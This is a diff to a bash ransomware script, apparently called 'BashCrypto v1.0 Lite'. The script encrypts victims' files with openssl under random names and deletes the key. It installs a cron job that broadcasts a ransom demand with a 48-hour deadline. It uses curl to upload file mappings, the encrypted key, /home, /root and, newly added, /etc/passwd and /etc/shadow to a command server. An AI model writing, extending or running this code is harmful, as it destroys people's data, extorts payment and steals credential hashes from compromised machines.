@@ -36,7 +36,7 @@ genFileName() {
 }
 
 genExtName() {
-  # Generate random value for the filename string size between 5 and 10
+  # Generate random value for the filename string size between 2 and 5
   # Build a filename string with the length of this random size out of the character set 'a-z'
   randString=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 2-5 -n 1) | head -n 1)
 
@@ -146,7 +146,9 @@ do
     setExtName=$(genExtName)
     getDirName="$(dirname ${file})"
 
-    echo "${file},${getDirName}/${setFileName}.${setExtName}" >> /root/..file_mapping.db
+    filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')
+
+    echo "${file},${getDirName}/${setFileName}.${setExtName},${filePerms}" >> /root/..file_mapping.db
    
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
@@ -164,7 +166,9 @@ do
     setExtName=$(genExtName)
     getDirName="$(dirname ${file})"
 
-    echo "${file},${getDirName}/${setFileName}.${setExtName}" >> /root/..file_mapping.db
+    filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')
+
+    echo "${file},${getDirName}/${setFileName}.${setExtName},${filePerms}" >> /root/..file_mapping.db
 
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
@@ -191,19 +195,19 @@ done
 {
   echo -en  "#"'!'"/bin/bash"
   echo -e "\n"
-  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
+  echo -e "wallCmd=\$(which wall)"
+  echo -e "\n"
+  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
 
-getTTY=$(tty)
-
 if [ "${osType}" == "redhat" ]
 then
-  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - &>/dev/null
+  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh"; } | /usr/bin/crontab - &>/dev/null
 elif [ "${osType}" == "debian" ]
 then
-  /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - &>/dev/null
+  /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh"; } | /usr/bin/crontab - &>/dev/null
 else
   echo "Could not set crontab" &>/dev/null
 fi
@@ -217,5 +221,7 @@ rm -rf /root/key.bin
 # Exfil files to our C2
 tar czf - /root/..file_mapping.db.owned |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=file_mapping.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=enc_key.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+tar czf - /etc/passwd | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=passwd.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+tar czf - /etc/shadow | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=shadow.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=home.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /root/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=root.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
